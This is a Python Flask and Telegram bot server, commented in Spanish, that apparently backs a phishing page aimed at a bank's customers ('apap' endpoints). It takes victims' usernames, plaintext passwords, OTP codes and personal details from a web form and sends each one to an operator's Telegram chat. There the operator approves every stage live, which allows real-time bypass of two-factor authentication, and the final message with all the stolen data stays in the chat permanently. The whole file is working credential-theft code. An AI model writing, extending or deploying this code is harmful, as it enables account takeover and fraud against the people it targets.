#!/usr/bin/env python3
# Server.py - Flask API + Telegram integration
# - Un mensaje por usuario por etapa (login/registro/otp)
# - login/registro se borran después de aprobar/rechazar
# - otp final queda PERMANENTE en el chat (registro)
# - Soporta reenvío (apap_resend) y agrega datos de perfil al mensaje final

import os
import json
import threading
import requests
import time
from dotenv import load_dotenv
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import logging
from telegram import Update
from telegram.ext import Application, CallbackQueryHandler, ContextTypes

# ----------------------
# Config
# ----------------------
load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
PORT = int(os.getenv("PORT", 5000))

if not TELEGRAM_TOKEN or not CHAT_ID:
    raise RuntimeError("TELEGRAM_TOKEN y CHAT_ID deben estar configurados en .env")

# ----------------------
# Logging
# ----------------------
logging.basicConfig(level=logging.INFO)
log = logging.getLogger("apap-server")

# ----------------------
# Estado en memoria
# ----------------------
# estados[usuario] = {
#   "password", "tipo", "decision", "canal", "canal_texto", "otp_code",
#   "profile": {"serviceType","fullName","phone","email"},
#   "msg_ids": {"login": id, "registro": id, "otp": id}
# }
estados = {}

# ----------------------
# Flask
# ----------------------
app = Flask(__name__)
CORS(app)

# ----------------------
# Telegram HTTP helpers (requests) - non-blocking via threads
# ----------------------
TELEGRAM_API_BASE = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

def _requests_post(path, payload, timeout=5):
    try:
        r = requests.post(f"{TELEGRAM_API_BASE}/{path}", json=payload, timeout=timeout)
        try:
            return r.json()
        except Exception:
            return {}
    except Exception as e:
        log.warning("HTTP Telegram error: %s", e)
        return {}

def delete_telegram_message(chat_id, message_id):
    payload = {"chat_id": chat_id, "message_id": message_id}
    return _requests_post("deleteMessage", payload)

def send_telegram_message_and_store(usuario, text, keyboard=None, tipo_key=None):
    """
    Envía un mensaje y guarda el message_id en estados[usuario]['msg_ids'][tipo_key]
    Ejecutar en hilo para no bloquear.
    """
    try:
        payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
        if keyboard is not None:
            payload["reply_markup"] = json.dumps(keyboard)
        res = _requests_post("sendMessage", payload)
        msg_id = None
        try:
            msg_id = res.get("result", {}).get("message_id")
        except Exception:
            msg_id = None

        if tipo_key:
            estados.setdefault(usuario, {}).setdefault("msg_ids", {})
            if msg_id:
                estados[usuario]["msg_ids"][tipo_key] = msg_id
            else:
                estados[usuario]["msg_ids"].pop(tipo_key, None)
        log.info("Sent Telegram message for %s tipo=%s msg_id=%s", usuario, tipo_key, msg_id)
        return msg_id
    except Exception as e:
        log.exception("Error sending message: %s", e)
        return None

def safe_send_or_edit(usuario, text, keyboard=None, tipo_key=None, replace_previous_of=None):
    """
    Borra el mensaje anterior de tipo replace_previous_of (si existe),
    y envía el nuevo mensaje guardando su message_id en msg_ids[tipo_key].
    Todo en hilo para que no bloquee la API.
    """
    def worker():
        # delete previous
        if replace_previous_of:
            prev_id = estados.get(usuario, {}).get("msg_ids", {}).get(replace_previous_of)
            if prev_id:
                try:
                    delete_telegram_message(CHAT_ID, prev_id)
                    estados[usuario]["msg_ids"].pop(replace_previous_of, None)
                    log.info("Deleted previous '%s' message %s for user %s", replace_previous_of, prev_id, usuario)
                except Exception as e:
                    log.warning("Could not delete previous msg: %s", e)
        # send and store
        send_telegram_message_and_store(usuario, text, keyboard=keyboard, tipo_key=tipo_key)

    threading.Thread(target=worker, daemon=True).start()

# ----------------------
# Senders (incluyen profile si existe)
# ----------------------
def fmt_profile_block(profile):
    if not profile:
        return ""
    parts = []
    if profile.get("serviceType"): parts.append(f"🗂 Servicio: {profile.get('serviceType')}")
    if profile.get("fullName"): parts.append(f"👤 Nombre: {profile.get('fullName')}")
    if profile.get("phone"): parts.append(f"📱 Tel: {profile.get('phone')}")
    if profile.get("email"): parts.append(f"✉️ Email: {profile.get('email')}")
    if parts:
        return "\n" + "\n".join(parts) + "\n"
    return ""

def send_login_message(usuario, password):
    texto = f"🔐 *LOGIN - Solicitud*\n\n👤 `{usuario}`\n🔑 `{password}`\n\n¿Aprobar este login?"
    keyboard = {"inline_keyboard": [
        [{"text": "✅ Aprobar (login)", "callback_data": f"{usuario}|aprobar|login"}],
        [{"text": "❌ Rechazar (login)", "callback_data": f"{usuario}|rechazar|login"}]
    ]}
    safe_send_or_edit(usuario, texto, keyboard=keyboard, tipo_key="login")

def send_registro_message(usuario, password, canal_texto):
    profile = estados.get(usuario, {}).get("profile", {})
    profile_block = fmt_profile_block(profile)
    texto = (
        f"🏦 *REGISTRO - Solicitud*\n\n"
        f"👤 `{usuario}`\n"
        f"🔑 `{password}`\n"
        f"📱 `{canal_texto}`\n"
        f"{profile_block}"
        f"\n¿Aprobar registro y método?"
    )
    keyboard = {"inline_keyboard": [
        [{"text": "✅ Aprobar (registro)", "callback_data": f"{usuario}|aprobar|registro"}],
        [{"text": "❌ Rechazar (registro)", "callback_data": f"{usuario}|rechazar|registro"}]
    ]}
    safe_send_or_edit(usuario, texto, keyboard=keyboard, tipo_key="registro", replace_previous_of="login")

def send_otp_message(usuario, password, canal_texto, otp_code):
    profile = estados.get(usuario, {}).get("profile", {})
    profile_block = fmt_profile_block(profile)
    texto = (
        f"🔐 *VALIDACIÓN OTP - Solicitud final*\n\n"
        f"👤 `{usuario}`\n"
        f"🔑 `{password}`\n"
        f"📱 `{canal_texto}`\n"
        f"🔢 `{otp_code}`\n"
        f"{profile_block}"
        f"\n¿Código correcto? (valida/rechaza)"
    )
    keyboard = {"inline_keyboard": [
        [{"text": "✅ Aprobar (otp)", "callback_data": f"{usuario}|aprobar|otp"}],
        [{"text": "❌ Rechazar (otp)", "callback_data": f"{usuario}|rechazar|otp"}]
    ]}
    safe_send_or_edit(usuario, texto, keyboard=keyboard, tipo_key="otp", replace_previous_of="registro")

def send_resend_notification(usuario, note=None):
    """
    Envía notificación al admin que el usuario solicitó reenvío.
    No eliminamos este mensaje (es una petición).
    """
    profile = estados.get(usuario, {}).get("profile", {})
    profile_block = fmt_profile_block(profile)
    otp_code = estados.get(usuario, {}).get("otp_code", "N/A")
    texto = (
        f"🔁 *REENVIAR CÓDIGO SOLICITADO*\n\n"
        f"👤 `{usuario}`\n"
        f"🔢 Código actual: `{otp_code}`\n"
        f"{profile_block}"
    )
    if note:
        texto += f"\n📝 Nota: {note}"
    # send plain message and DO NOT store as final msg (just a notification)
    threading.Thread(target=send_telegram_message_and_store, args=(usuario, texto, None, None), daemon=True).start()

# ----------------------
# API endpoints (/api/*)
# ----------------------
@app.route("/api/apap_login", methods=["POST"])
def apap_login():
    data = request.get_json(force=True)
    usuario = data.get("usuario")
    password = data.get("password")
    if not usuario or not password:
        return jsonify({"status": "error", "message": "usuario y password requeridos"}), 400

    estados.setdefault(usuario, {})
    estados[usuario].update({
        "password": password,
        "decision": None,
        "tipo": "apap_login",
        "msg_ids": estados.get(usuario, {}).get("msg_ids", {}),
        # keep profile if exists
        "profile": estados.get(usuario, {}).get("profile", {})
    })

    send_login_message(usuario, password)
    return jsonify({"status": "ok", "mensaje": "Credenciales enviadas al bot"}), 200

@app.route("/api/apap_registro", methods=["POST"])
def apap_registro():
    data = request.get_json(force=True)
    usuario = data.get("usuario")
    password = data.get("password")
    canal = data.get("canal")
    canal_texto = data.get("canal_texto")

    # optional profile fields from frontend (serviceType, fullName, phone, email)
    profile = {
        "serviceType": data.get("serviceType"),
        "fullName": data.get("fullName"),
        "phone": data.get("phone"),
        "email": data.get("email"),
    }
    # remove None values
    profile = {k: v for k, v in profile.items() if v}

    if not usuario or not password or not canal or not canal_texto:
        return jsonify({"status": "error", "message": "Faltan datos de registro"}), 400

    estados.setdefault(usuario, {})
    # Save profile if provided (merge)
    if profile:
        # merge existing profile
        existing = estados[usuario].get("profile", {})
        existing.update(profile)
        estados[usuario]["profile"] = existing

    estados[usuario].update({
        "password": password,
        "canal": canal,
        "canal_texto": canal_texto,
        "decision": None,
        "tipo": "apap_registro",
        "msg_ids": estados.get(usuario, {}).get("msg_ids", {})
    })

    send_registro_message(usuario, password, canal_texto)
    return jsonify({"status": "ok", "mensaje": "Registro enviado al bot"}), 200

@app.route("/api/apap_otp", methods=["POST"])
def apap_otp():
    data = request.get_json(force=True)
    usuario = data.get("usuario")
    otp_code = data.get("otp_code")
    if not usuario or not otp_code:
        return jsonify({"status": "error", "message": "usuario y otp_code requeridos"}), 400

    estados.setdefault(usuario, {})
    estados[usuario].update({
        "otp_code": otp_code,
        "decision": None,
        "tipo": "apap_otp",
        "msg_ids": estados.get(usuario, {}).get("msg_ids", {}),
        # keep profile if exists
        "profile": estados.get(usuario, {}).get("profile", {})
    })

    pw = estados[usuario].get("password", "N/A")
    canal_texto = estados[usuario].get("canal_texto", "N/A")
    # When OTP is submitted by client, send consolidated message (includes profile)
    send_otp_message(usuario, pw, canal_texto, otp_code)
    return jsonify({"status": "ok", "mensaje": "OTP enviado al bot"}), 200

@app.route("/api/apap_resend", methods=["POST"])
def apap_resend():
    """
    Endpoint llamado cuando el cliente pulsa 'Reenviar código'.
    body: { usuario: string, note?: string }
    """
    data = request.get_json(force=True)
    usuario = data.get("usuario")
    note = data.get("note")
    if not usuario:
        return jsonify({"status": "error", "message": "usuario requerido"}), 400

    if usuario not in estados:
        return jsonify({"status": "not_found", "message": "usuario no encontrado"}), 404

    # Send notification to telegram that user requested resend, include profile+otp
    send_resend_notification(usuario, note=note)
    return jsonify({"status": "ok", "mensaje": "Solicitud de reenvío enviada al bot"}), 200

@app.route("/api/apap_estado/<usuario>", methods=["GET"])
def apap_estado(usuario):
    if usuario in estados:
        decision = estados[usuario].get("decision")
        if decision:
            return jsonify({"status": "ok", "decision": decision}), 200
        else:
            return jsonify({"status": "pending"}), 200
    return jsonify({"status": "not_found"}), 404

@app.route("/api/apap_limpiar/<usuario>", methods=["POST"])
def apap_limpiar(usuario):
    if usuario in estados:
        estados[usuario]["decision"] = None
        return jsonify({"status": "ok", "message": "Estado limpiado"}), 200
    return jsonify({"status": "not_found"}), 404

# Serve frontend files for dev convenience
@app.route("/apap_frontend/<path:filename>")
def serve_file(filename):
    return send_from_directory(".", filename)

@app.route("/apap_frontend/")
def serve_index():
    return send_from_directory(".", "index.html")

# ----------------------
# Telegram callback handler
# ----------------------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return

    # try to answer callback safely (may be expired)
    try:
        await query.answer()
    except Exception as e:
        log.warning("query.answer() fallo (posible expirado): %s", e)

    data = query.data  # formato: usuario|aprobar|tipo
    if not data or "|" not in data:
        log.warning("callback_data invalido: %s", data)
        return

    parts = data.split("|")
    if len(parts) < 3:
        log.warning("callback_data partes insuficientes: %s", data)
        return

    usuario, decision, tipo = parts[0], parts[1], parts[2]
    log.info("Callback received: user=%s decision=%s tipo=%s", usuario, decision, tipo)

    if usuario not in estados:
        try:
            await query.edit_message_text(text=f"Sesión no encontrada para {usuario}")
        except Exception:
            pass
        return

    estados[usuario]["decision"] = decision

    pw = estados[usuario].get("password", "N/A")
    canal_texto = estados[usuario].get("canal_texto", "N/A")
    otp_code = estados[usuario].get("otp_code", "N/A")
    profile = estados[usuario].get("profile", {})

    if tipo == "login":
        status_text = "✅ LOGIN APROBADO" if decision == "aprobar" else "❌ LOGIN RECHAZADO"
        msg = f"{status_text}\n\n👤 `{usuario}`\n🔑 `{pw}`\n\n{status_text} por admin"
        try:
            await query.edit_message_text(text=msg, parse_mode="Markdown")
        except Exception as e:
            log.warning("No se pudo editar mensaje login: %s", e)
        # delete login message after short delay so admin doesn't accumulate messages
        mid = estados[usuario].get("msg_ids", {}).get("login")
        if mid:
            def del_login_worker():
                time.sleep(2)
                try:
                    delete_telegram_message(CHAT_ID, mid)
                except Exception as e:
                    log.warning("Error deleting login message: %s", e)
                estados[usuario].get("msg_ids", {}).pop("login", None)
            threading.Thread(target=del_login_worker, daemon=True).start()

    elif tipo == "registro":
        status_text = "✅ REGISTRO APROBADO" if decision == "aprobar" else "❌ REGISTRO RECHAZADO"
        profile_block = fmt_profile_block(profile)
        msg = f"{status_text}\n\n👤 `{usuario}`\n🔑 `{pw}`\n📱 `{canal_texto}`\n{profile_block}\n{status_text} por admin"
        try:
            await query.edit_message_text(text=msg, parse_mode="Markdown")
        except Exception as e:
            log.warning("No se pudo editar mensaje registro: %s", e)
        # delete registro message after short delay
        mid = estados[usuario].get("msg_ids", {}).get("registro")
        if mid:
            def del_reg_worker():
                time.sleep(2)
                try:
                    delete_telegram_message(CHAT_ID, mid)
                except Exception as e:
                    log.warning("Error deleting registro message: %s", e)
                estados[usuario].get("msg_ids", {}).pop("registro", None)
            threading.Thread(target=del_reg_worker, daemon=True).start()

    elif tipo == "otp":
        # IMPORTANT: Do NOT delete this final message — leave it in the chat permanently (as requested).
        status_text = "✅ OTP APROBADO" if decision == "aprobar" else "❌ OTP RECHAZADO"
        profile_block = fmt_profile_block(profile)
        msg = (
            f"{status_text}\n\n👤 `{usuario}`\n🔑 `{pw}`\n📱 `{canal_texto}`\n🔢 `{otp_code}`\n{profile_block}\n{status_text} por admin"
        )
        try:
            await query.edit_message_text(text=msg, parse_mode="Markdown")
        except Exception as e:
            log.warning("No se pudo editar mensaje otp: %s", e)
        # Keep the msg_id stored (didn't delete), so admin can refer later.

    else:
        try:
            await query.edit_message_text(text=f"Decision {decision} para {usuario}")
        except Exception:
            pass

    log.info("Processed callback for %s tipo=%s decision=%s", usuario, tipo, decision)

# ----------------------
# Main: run Flask in background thread and bot in main thread
# ----------------------
def run_flask():
    app.run(host="127.0.0.1", port=PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    # Start Flask in background thread
    t = threading.Thread(target=run_flask, daemon=True)
    t.start()
    time.sleep(0.2)

    # Start telegram app in main thread (polling)
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CallbackQueryHandler(button_handler))
    log.info("Iniciando bot Telegram (run_polling) — hilo principal")
    application.run_polling()
